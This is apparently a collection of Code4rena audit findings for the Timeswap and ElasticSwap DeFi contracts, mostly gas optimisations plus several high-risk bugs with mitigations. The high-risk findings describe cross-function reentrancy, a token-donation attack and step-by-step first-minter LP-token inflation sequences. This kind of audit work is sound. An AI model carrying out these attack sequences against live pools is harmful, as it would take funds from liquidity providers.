"https://github.com/code-423n4/2022-01-timeswap-findings/issues/7", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  jayjonah8   # Vulnerability details  ## Impact In TimeswapPair.sol, the pay() function has a callback to the msg.sender in the middle of the function while there are still updates to state that take place after the callback.  The lock modifier guards against reentrancy but not against cross function reentrancy.  Since the protocol implements Uniswap like functionality,  this can be extremely dangerous especially with regard to composability/interacting with other protocols and contracts.  The callback before important state changes (updates to reserves collateral and reserves assets) also violates the Checks Effects Interactions best practices further widening the attack surface.   ## Proof of Concept https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L369  https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html  cross function reentrancy https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21  ## Tools Used Manual code review   ## Recommended Mitigation Steps The callback \"if (assetIn > 0) Callback.pay(asset, assetIn, data);\"  should be placed at the end of the pay() function after all state updates have taken place.   "}, {"title": "borrow() function has state updates after a callback to msg.sender ", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/6", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  jayjonah8   # Vulnerability details  ## Impact In TimeswapPair.sol, the borrow() function has a callback to the msg.sender in the middle of the function while there are still updates to state that take place after the callback.  The lock modifier guards against reentrancy but not against cross function reentrancy.  Since the protocol implements Uniswap like functionality,  this can be extremely dangerous especially with regard to composability/interacting with other protocols and contracts.  The callback before important state changes (updates to collateral, totalDebtCreated and reserves assets) also violates the Checks Effects Interactions best practices further widening the attack surface.   ## Proof of Concept https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L322  https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html  cross function reentrancy https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21  ## Tools Used Manual code review   ## Recommended Mitigation Steps The callback Callback.borrow(collateral, dueOut.collateral, data); should be placed at the end of the borrow() function after all state updates have taken place.   "}, {"title": "In the lend() function state updates are made after the callback ", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/5", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  jayjonah8   # Vulnerability details  ## Impact In TimeswapPair.sol, the lend() function has a callback to the msg.sender in the middle of the function while there are still updates to state that take place after the callback.  The lock modifier guards against reentrancy but not against cross function reentrancy.  Since the protocol implements Uniswap like functionality,  this can be extremely dangerous especially with regard to composability/interacting with other protocols and contracts.  The callback before important state changes (updates to totalClaims bonds,  insurance and reserves assets) also violates the Checks Effects Interactions best practices further widening the attack surface.   ## Proof of Concept https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L246  https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html  cross function reentrancy https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21  ## Tools Used Manual code review   ## Recommended Mitigation Steps The callback Callback.lend(asset, xIncrease, data); should be placed at the end of the lend() function after all state updates have taken place.   "}, {"title": "Important state updates are made after the callback in the mint() function ", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/4", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  jayjonah8   # Vulnerability details  ## Impact In TimeswapPair.sol, the mint() function has a callback in the middle of the function while there are still updates to state that take place after the callback.  The lock modifier guards against reentrancy but not against cross function reentrancy.  Since the protocol implements Uniswap like functionality,  this can be extremely dangerous especially with regard to composability/interacting with other protocols and contracts.  The callback before important state changes (updates to reserve asset, collateral, and totalDebtCreated) also violates the Checks Effects Interactions best practices further widening the attack surface.   ## Proof of Concept https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L177  https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html  cross function reentrancy https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21  ## Tools Used Manual code review   ## Recommended Mitigation Steps The callback Callback.mint(asset, collateral, xIncrease, dueOut.collateral, data) should be placed at the end of the mint() function after all state updates have taken place.   "}, {"title": "Repeated calls", "html_url": "https://github.com/code-423n4/2022-01-elasticswap-findings/issues/178", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-01-elasticswap-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact Result of this.totalSupply() could be cached to avoid duplicate calls: ```solidity   require(this.totalSupply() > 0, \"Exchange: INSUFFICIENT_LIQUIDITY\");   ...   uint256 totalSupplyOfLiquidityTokens = this.totalSupply(); ```   "}, {"title": "Unchecked maths", "html_url": "https://github.com/code-423n4/2022-01-elasticswap-findings/issues/177", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-01-elasticswap-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact Using the unchecked keyword to avoid redundant arithmetic checks and save gas when an underflow/overflow cannot happen, e.g.: ```solidity     if (rootK > rootKLast) {         uint256 numerator =             _totalSupplyOfLiquidityTokens * (rootK - rootKLast); ``` rootK - rootKLast will never underflow here.   "}, {"title": "quoteTokenQtyToReturn = internalBalances.quoteTokenReserveQty", "html_url": "https://github.com/code-423n4/2022-01-elasticswap-findings/issues/176", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-01-elasticswap-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact Would be cheapier to have >= here when quoteTokenQtyToReturn = internalBalances.quoteTokenReserveQty to skip math operation: ```solidity     // We should ensure no possible overflow here.     if (quoteTokenQtyToReturn > internalBalances.quoteTokenReserveQty) {         internalBalances.quoteTokenReserveQty = 0;     } else {         internalBalances.quoteTokenReserveQty -= quoteTokenQtyToReturn;     } ```   "}, {"title": "Inclusive conditions", "html_url": "https://github.com/code-423n4/2022-01-elasticswap-findings/issues/175", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-elasticswap-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact Conditions should be inclusive >= or <= : ```solidity   require(       baseTokenQty > _baseTokenQtyMin,       \"MathLib: INSUFFICIENT_BASE_TOKEN_QTY\"   );   require(       quoteTokenQty > _quoteTokenQtyMin,       \"MathLib: INSUFFICIENT_QUOTE_TOKEN_QTY\"   );   require(       _baseTokenQtyMin < maxBaseTokenQty,       \"MathLib: INSUFFICIENT_DECAY\"   );   require(       _quoteTokenQtyMin < maxQuoteTokenQty,       \"MathLib: INSUFFICIENT_DECAY\"   ); ```  Otherwise, these functions will fail when e.g. baseTokenQty = _baseTokenQtyMin when the end-user expects it to pass through.  "}, {"title": "Redundant code", "html_url": "https://github.com/code-423n4/2022-01-elasticswap-findings/issues/173", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-01-elasticswap-findings", "body": "# Handle  wuwe1   # Vulnerability details  ## Proof of Concept redundant code  https://github.com/code-423n4/2022-01-elasticswap/blob/main/elasticswap/src/contracts/Exchange.sol#L266-L269  https://github.com/code-423n4/2022-01-elasticswap/blob/main/elasticswap/src/libraries/MathLib.sol#L663-L666  ## Tools Used  remove Exchange.sol#L266-L269  "}, {"title": "saving gas by not returning the variables that was declared to be returned", "html_url": "https://github.com/code-423n4/2022-01-elasticswap-findings/issues/171", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-01-elasticswap-findings", "body": "# Handle  OriDabush   # Vulnerability details  ## Mathlib.sol (`calculateAddQuoteTokenLiquidityQuantities()`) In the `calculateAddQuoteTokenLiquidityQuantities()` function, the return line is unnecessary, because those variables are returned anyway (it will save gas if you'll remove the return line.)  ```sol return (quoteTokenQty, liquidityTokenQty); // remove this line to save gas ```  "}, {"title": "Gas Optimization: `> 0` is less efficient than `!= 0` for uint in require condition", "html_url": "https://github.com/code-423n4/2022-01-elasticswap-findings/issues/161", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-01-elasticswap-findings", "body": "# Handle  gzeon   # Vulnerability details  ## Impact `> 0` is less gas efficient than `!= 0` for uint in require condition when optimizer is enabled Ref: https://twitter.com/GalloDaSballo/status/1485430908165443590  ## Proof of Concept https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/contracts/Exchange.sol#L176 ```         require(this.totalSupply() > 0, \"Exchange: INSUFFICIENT_LIQUIDITY\"); ```   "}, {"title": "Initialize to default state is redundant", "html_url": "https://github.com/code-423n4/2022-01-elasticswap-findings/issues/158", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-01-elasticswap-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/contracts/Exchange.sol#L27-L28  ```solidity MathLib.InternalBalances public internalBalances =     MathLib.InternalBalances(0, 0, 0); ```  Initialize `internalBalances` to the default state is redundant.  Change to `MathLib.InternalBalances public internalBalances;` can make the code simpler and save some gas.  "}, {"title": "Cache and read storage variables from the stack can save gas", "html_url": "https://github.com/code-423n4/2022-01-elasticswap-findings/issues/156", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-01-elasticswap-findings", "body": "# Handle  WatchPug   # Vulnerability details  For the storage variables that will be accessed multiple times, cache and read from the stack can save ~100 gas from each extra read (`SLOAD` after Berlin).  For example:  https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/contracts/Exchange.sol#L217-L233  ```solidity   uint256 baseTokenQtyToRemoveFromInternalAccounting =       (_liquidityTokenQty * internalBalances.baseTokenReserveQty) /           totalSupplyOfLiquidityTokens;    internalBalances       .baseTokenReserveQty -= baseTokenQtyToRemoveFromInternalAccounting;    // We should ensure no possible overflow here.   if (quoteTokenQtyToReturn > internalBalances.quoteTokenReserveQty) {       internalBalances.quoteTokenReserveQty = 0;   } else {       internalBalances.quoteTokenReserveQty -= quoteTokenQtyToReturn;   }    internalBalances.kLast =       internalBalances.baseTokenReserveQty *       internalBalances.quoteTokenReserveQty; ```  `internalBalances.baseTokenReserveQty` and `internalBalances.quoteTokenReserveQty` can be cached.  ### Recommendation  Change to:  ```solidity uint256 internalBaseTokenReserveQty = internalBalances.baseTokenReserveQty; uint256 baseTokenQtyToRemoveFromInternalAccounting =     (_liquidityTokenQty * internalBaseTokenReserveQty) /         totalSupplyOfLiquidityTokens;  internalBalances     .baseTokenReserveQty = internalBaseTokenReserveQty = internalBaseTokenReserveQty - baseTokenQtyToRemoveFromInternalAccounting;  // We should ensure no possible overflow here. uint256 internalQuoteTokenReserveQty = internalBalances.quoteTokenReserveQty; if (quoteTokenQtyToReturn > internalQuoteTokenReserveQty) {     internalBalances.quoteTokenReserveQty = internalQuoteTokenReserveQty = 0; } else {     internalBalances.quoteTokenReserveQty = internalQuoteTokenReserveQty = internalQuoteTokenReserveQty - quoteTokenQtyToReturn; }  internalBalances.kLast =     internalBaseTokenReserveQty *     internalQuoteTokenReserveQty; ```  "}, {"title": " Outdated versions of OpenZeppelin library", "html_url": "https://github.com/code-423n4/2022-01-elasticswap-findings/issues/155", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-01-elasticswap-findings", "body": "# Handle  WatchPug   # Vulnerability details  Outdated versions of OpenZeppelin library are used.  New versions of OpenZeppelin libraries can be more gas efficient.   For example:  `ERC20.sol` in @openzeppelin/contracts@4.1.0:  https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.1.0/contracts/token/ERC20/ERC20.sol#L152-L153  ```solidity require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\"); _approve(sender, _msgSender(), currentAllowance - amount); ```  A gas optimization upgrade has been added to @openzeppelin/contracts@4.4.2:  https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.4.2/contracts/token/ERC20/ERC20.sol#L158-L161 ```solidity require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\"); unchecked {     _approve(sender, _msgSender(), currentAllowance - amount); } ```  "}, {"title": "Redundant `return` for named returns", "html_url": "https://github.com/code-423n4/2022-01-elasticswap-findings/issues/151", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-01-elasticswap-findings", "body": "# Handle  WatchPug   # Vulnerability details  Redundant code increase contract size and gas usage at deployment.  https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L227-L233  ```solidity function calculateAddQuoteTokenLiquidityQuantities(     uint256 _quoteTokenQtyDesired,     uint256 _quoteTokenQtyMin,     uint256 _baseTokenReserveQty,     uint256 _totalSupplyOfLiquidityTokens,     InternalBalances storage _internalBalances ) public returns (uint256 quoteTokenQty, uint256 liquidityTokenQty) { ```  https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L282-L282  ```solidity return (quoteTokenQty, liquidityTokenQty); ```  L282, `return (quoteTokenQty, liquidityTokenQty)` is redundant.   "}, {"title": "Simplify `MathLib#sqrt()` can save gas", "html_url": "https://github.com/code-423n4/2022-01-elasticswap-findings/issues/147", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-01-elasticswap-findings", "body": "# Handle  WatchPug   # Vulnerability details  The check of `y > 3` is unnecessary and most certainly adds more gas cost than it saves as the majority of use cases of this function will not be handling `y <= 3`.  https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L82-L93  ```solidity function sqrt(uint256 y) internal pure returns (uint256 z) {     if (y > 3) {         z = y;         uint256 x = y / 2 + 1;         while (x < z) {             z = x;             x = (y / x + x) / 2;         }     } else if (y != 0) {         z = 1;     } } ```   ### Recommendation  Change to:  ```solidity function sqrt(uint x) public pure returns (uint y) {     uint z = (x + 1) / 2;     y = x;     while (z < y) {         y = z;         z = (x / z + z) / 2;     } } ```  Or use:  https://github.com/Rari-Capital/solmate/blob/dd13c61b5f9cb5c539a7e356ba94a6c2979e9eb9/src/utils/FixedPointMathLib.sol#L150-L205   "}, {"title": "[WP-H2] Transferring `quoteToken` to the exchange pool contract will cause future liquidity providers to lose funds", "html_url": "https://github.com/code-423n4/2022-01-elasticswap-findings/issues/146", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-elasticswap-findings", "body": "# Handle  WatchPug   # Vulnerability details  In the current implementation, the amount of LP tokens to be minted when `addLiquidity()` is calculated based on the ratio between the amount of newly added `quoteToken` and the current wallet balance of `quoteToken` in the `Exchange` contract.  However, since anyone can transfer `quoteToken` to the contract, and make the balance of `quoteToken` to be larger than `_internalBalances.quoteTokenReserveQty`, existing liquidity providers can take advantage of this by donating `quoteToken` and make future liquidity providers receive fewer LP tokens than expected and lose funds.  https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L578-L582  ```solidity liquidityTokenQty = calculateLiquidityTokenQtyForDoubleAssetEntry(     _totalSupplyOfLiquidityTokens,     quoteTokenQty,     _quoteTokenReserveQty // IERC20(quoteToken).balanceOf(address(this)) ); ```  ### PoC  Given:  - The `Exchange` pool is new;  1. Alice `addLiquidity()` with `1e18 baseToken` and `1e18 quoteToken`, recived `1e18` LP token; 2. Alice transfer `99e18 quoteToken` to the `Exchange` pool contract; 3. Bob `addLiquidity()` with `1e18 baseToken` and `1e18 quoteToken`; 3. Bob `removeLiquidity()` with all the LP token in balance.  **Expected Results**: Bob recived `1e18 baseToken` and >= `1e18 quoteToken`.  **Actual Results**: Bob recived ~`0.02e18 baseToken` and ~`1e18 quoteToken`.  Alice can now `removeLiquidity()` and recive ~`1.98e18 baseToken` and ~`100e18 quoteToken`.  As a result, Bob suffers a fund loss of `0.98e18 baseToken`.  ### Recommendation  Change to:  ```solidity liquidityTokenQty = calculateLiquidityTokenQtyForDoubleAssetEntry(     _totalSupplyOfLiquidityTokens,     quoteTokenQty,     _internalBalances.quoteTokenReserveQty ); ```  "}, {"title": "[WP-H1] The value of LP token can be manipulated by the first minister, which allows the attacker to dilute future liquidity providers' shares", "html_url": "https://github.com/code-423n4/2022-01-elasticswap-findings/issues/145", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2022-01-elasticswap-findings", "body": "# Handle  WatchPug   # Vulnerability details  For the first minter of an Exchange pool, the ratio of `X/Y` and the `totalSupply` of the LP token can be manipulated.  A sophisticated attacker can mint and burn all of the LP tokens but `1 Wei`, and then artificially create a situation of rebasing up by transferring baseToken to the pool contract. Then `addLiquidity()` in `singleAssetEntry` mode.  Due to the special design of `singleAssetEntry` mode, the value of LP token can be inflated very quickly.  As a result, `1 Wei` of LP token can be worthing a significate amount of baseToken and quoteToken.  Combine this with the precision loss when calculating the amount of LP tokens to be minted to the new liquidity provider, the attacker can turn the pool into a trap which will take a certain amount of cut for all future liquidity providers by minting fewer LP tokens to them.  https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L493-L512  ```solidity } else {     // this user will set the initial pricing curve     require(         _baseTokenQtyDesired > 0,         \"MathLib: INSUFFICIENT_BASE_QTY_DESIRED\"     );     require(         _quoteTokenQtyDesired > 0,         \"MathLib: INSUFFICIENT_QUOTE_QTY_DESIRED\"     );      tokenQtys.baseTokenQty = _baseTokenQtyDesired;     tokenQtys.quoteTokenQty = _quoteTokenQtyDesired;     tokenQtys.liquidityTokenQty = sqrt(         _baseTokenQtyDesired * _quoteTokenQtyDesired     );      _internalBalances.baseTokenReserveQty += tokenQtys.baseTokenQty;     _internalBalances.quoteTokenReserveQty += tokenQtys.quoteTokenQty; } ```  https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L204-L212  ```solidity function calculateLiquidityTokenQtyForDoubleAssetEntry(     uint256 _totalSupplyOfLiquidityTokens,     uint256 _quoteTokenQty,     uint256 _quoteTokenReserveBalance ) public pure returns (uint256 liquidityTokenQty) {     liquidityTokenQty =         (_quoteTokenQty * _totalSupplyOfLiquidityTokens) /         _quoteTokenReserveBalance; } ```  ### PoC  Given:  - The `Pool` is newly created; - The market price of `baseToken` in terms of `quoteToken` is `1`.  The attacker can do the following steps in one tx:  1. `addLiquidity()` with `2 Wei of baseToken` and `100e18 quoteToken`, received `14142135623` LP tokens; 2. `removeLiquidity()` with `14142135622` LP tokens, the Pool state becomes: - totalSupply of LP tokens: 1 Wei - baseTokenReserveQty: 1 Wei - quoteTokenReserveQty: 7071067813 Wei 3. `baseToken.transfer()` 7071067812 Wei to the Pool contract; 4. `addLiquidity()` with no baseToken and `50e18 quoteToken`; 5. `swapBaseTokenForQuoteToken()` with `600000000000000 baseToken`, the Pool state becomes: - totalSupply of LP tokens: 1 Wei - quoteTokenReserveQty 591021750159032 - baseTokenReserveQty 600007071067801 6. `baseToken.transfer()` 999399992928932200 Wei to the Pool contract; 7. `addLiquidity()` with no baseToken and `1e18 quoteToken`, the Pool state becomes: - totalSupply of LP tokens: 1 Wei - quoteTokenReserveQty: 1000000000000000013 - quoteTokenReserveQty: 985024641638342212 - baseTokenDecay: 0  From now on, `addLiquidity()` with less than `1e18` of `baseToken` and `quoteToken` will receive `0` LP token due to precision loss.  The amounts can be manipulated to higher numbers and cause most future liquidity providers to receive fewer LP tokens than expected, and the attacker will be able to profit from it as the attacker will take a larger share of the pool than expected.  ### Recommendation  Consider requiring a certain amount of minimal LP token amount (eg, 1e8) for the first minter and lock some of the first minter's LP tokens by minting ~1% of the initial amount to the factory address.  "}, {"title": "[WP-H0] In the case of Single Asset Entry, new liquidity providers will suffer fund loss due to wrong formula of \u0394Ro", "html_url": "https://github.com/code-423n4/2022-01-elasticswap-findings/issues/144", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-elasticswap-findings", "body": "# Handle  WatchPug   # Vulnerability details  ### Current Implementation  #### When `baseToken` rebase up  Per the document: https://github.com/ElasticSwap/elasticswap/blob/a90bb67e2817d892b517da6c1ba6fae5303e9867/ElasticSwapMath.md#:~:text=When%20there%20is%20alphaDecay  and related code: https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L227-L283  `Gamma` is the ratio of shares received by the new liquidity provider when `addLiquidity()` (\u0394Ro) to the new totalSupply (total shares = Ro' = Ro + \u0394Ro).  ``` \u0394Ro = (Ro/(1 - \u03b3)) * \u03b3          Ro * Gamma     = --------------          1 - Gamma \u27fa \u0394Ro * ( 1 - Gamma ) = Gamma * Ro \u0394Ro - Gamma * \u0394Ro = Gamma * Ro \u0394Ro = Gamma * Ro + Gamma * \u0394Ro            \u0394Ro     Gamma = ---------          Ro + \u0394Ro  ```  In the current implementation:  ``` \u03b3 = \u0394Y / Y' / 2 * ( \u0394X / \u03b1^ ) ```  \u0394Y is the `quoteToken` added by the new liquidity provider. See: -   https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L277  Y' is the new Y after `addLiquidity()`, `Y' = Y + \u0394Y`. See: -   https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L272 -   https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L278  \u0394X is `\u0394Y * Omega`. See: -   https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L259-L263 -   https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L279  \u03b1^ is `Alpha - X`. See: -   https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L234-L235 -   https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L280   For instance:  Given: -   Original State: X = Alpha = 1, Y = Beta = 1, Omega = X/Y = 1 -   When `baseToken` rebase up: Alpha becomes 10 -   Current State: Alpha = 10, X = 1, Y = Beta = 1, Omega = 1   When: new liquidity provider `addLiquidity()` with 4 quoteToken:  ```              4          4 * Omega      16 Gamma = ------------ * ------------ = ----          (1+4) * 2       10 - 1        90 ``` After `addLiquidity()`:  -   baseToken belongs to the newLP: 10 * 16 / 90 = 160 / 90 = 1.7777777777777777 -   quoteToken belongs to the newLP: (1+4) * 16 / 90 = 80 / 90 = 0.8888888888888888 -   In the terms of `quoteToken`, the total value is: 160 / 90 / Omega + 80 / 90 = 240 / 90 = 2.6666666666666665   As a result, the new liquidity provider suffers a fund loss of `4 - 240 / 90 = 1.3333333333333333 in the terms of quoteToken`  The case above can be reproduced by changing the numbers in [this test unit](https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/test/exchangeTest.js#L1804).   #### When `baseToken` rebase down   Per the document: https://github.com/ElasticSwap/elasticswap/blob/a90bb67e2817d892b517da6c1ba6fae5303e9867/ElasticSwapMath.md#:~:text=When%20there%20is%20betaDecay  and related code: https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L297-L363  `Gamma` is the ratio of shares received by the new liquidity provider when `addLiquidity()` (\u0394Ro) to the new totalSupply (total shares = Ro' = Ro + \u0394Ro).   ``` \u0394Ro = (Ro/(1 - \u03b3)) * \u03b3          Ro * Gamma     = --------------          1 - Gamma \u27fa \u0394Ro * ( 1 - Gamma ) = Gamma * Ro \u0394Ro - Gamma * \u0394Ro = Gamma * Ro \u0394Ro = Gamma * Ro + Gamma * \u0394Ro            \u0394Ro     Gamma = ---------          Ro + \u0394Ro  ```  In the current implementation:  ``` \u03b3 = \u0394X / X / 2 * ( \u0394XByQuoteTokenAmount / \u03b2^ ) ```  \u0394X is the amount of `baseToken` added by the new liquidity provider. See: -   https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L357  X is the balanceOf `baseToken`. See: -   https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L358  \u0394XByQuoteTokenAmount is \u0394X / Omega, the value of \u0394X in the terms of `quoteToken`. See: -   https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L318-L322 -   https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L329-L333 -   https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L359  \u03b2^ is max\u0394X / Omega, the value of max\u0394X in the terms of `quoteToken`. `max\u0394X = X - Alpha`. See: -   https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L304-L305 -   https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L318-L322 -   https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L341-L342 -   https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L360    For instance:  Given: -   Original State: X = Alpha = 10, Y = Beta = 10, Omega = X/Y = 1 -   When `baseToken` rebase down, Alpha becomes 1 -   Current State: Alpha = 1, X = 10, Y = Beta = 10, Omega = 1   When: new liquidity provider `addLiquidity()` with `4 baseToken` ```             4          4 / Omega       8 Gamma = -------- * ---------------- = ----           10 * 2    (10-1) / Omega     90 ``` After `addLiquidity()`: -   baseToken belongs to the newLP: (1 + 4) * 8 / 90 = 40 / 90 = 0.4444444444444444 -   quoteToken belongs to the newLP: 10 * 8 / 90 = 80 / 90 = 0.8888888888888888 -   In the terms of quoteToken, the total value is: 40 / 90 + 80 / 90 * Omega = 120 / 90 = 1.3333333333333333 < 4  As a result, the new liquidity provider suffers a fund loss of `4 - 120 / 90 = 2.6666666666666665 in the terms of quoteToken`  The case above can be reproduced by changing the numbers in [this test unit](https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/test/exchangeTest.js#L2146).   ### The correct formula for \u0394Ro  #### When baseToken rebase up  ```md When: new liquidity provider addLiquidity with \u0394Y quoteToken (\u0394Y <= max\u0394Y or \u0394Y <= \u03b1^ / \u03c9)  After addLiquidity(): -   baseToken belongs to the newLP: \u0394XOfNewLP -   quoteToken belongs to the newLP: \u0394YOfNewLP  \u0394Y can be divided into 2 parts: -   \u0394YToX: the part used for swap \u0394XOfNewLP.  \u0394XOfNewLP = \u0394YToX * Omega                  (a1) -   \u0394Y - \u0394YToX: the rest as \u0394YOfNewLP  The ratio of newly minted LP tokens for new liquidity provider to the new totalSupply (Ro'): Gamma              \u0394Ro       \u0394Y - \u0394YToX     \u0394XOfNewLP        = --------- = ----------- = -----------                                    (a2)          Ro + \u0394Ro     Y + \u0394Y          Alpha                       \u0394Y - \u0394YToX     \u0394YToX * Omega                      = ----------- = ---------------   // substituting (a1)             (a_exp1)                       Y + \u0394Y          Alpha          \u27fa  (\u0394Y - \u0394YToX) * Alpha = \u0394YToX * Omega * (Y + \u0394Y) \u0394Y * Alpha - \u0394YToX * Alpha = \u0394YToX * Omega * (Y + \u0394Y) \u0394Y * Alpha = \u0394YToX * Alpha + \u0394YToX * Omega * (Y + \u0394Y)            = \u0394YToX * ( Alpha + Omega * (Y + \u0394Y))                \u0394Y * Alpha                  \u0394Y * Alpha             \u0394YToX = ---------------------------  = --------------------                       (a_r1)          Alpha + Omega * (Y + \u0394Y)       Alpha + Omega * Y'      Continue from (a_exp1):            \u0394YToX * Omega  Gamma  = ---------------             Alpha                       \u0394Y * Omega        = -----------------------   // substituting (a_r1)                              (a_r2(1))            Alpha + Omega * Y'                   \u0394Y         = ---------------------                                                   (a_r2(2))             Alpha/Omega + Y'   Gamma is the ratio of \u0394Y to the total amounts of baseToken and quoteToken after addLiquidity: -   (a_r2(1)) is the formula in the terms of baseToken -   (a_r2(2)) is the formula in the terms of quoteToken    Based on (a2):             \u0394Ro     Gamma = ---------          Ro + \u0394Ro  \u27fa \u0394Ro = Gamma * Ro + Gamma * \u0394Ro \u0394Ro - Gamma * \u0394Ro = Gamma * Ro \u0394Ro * ( 1 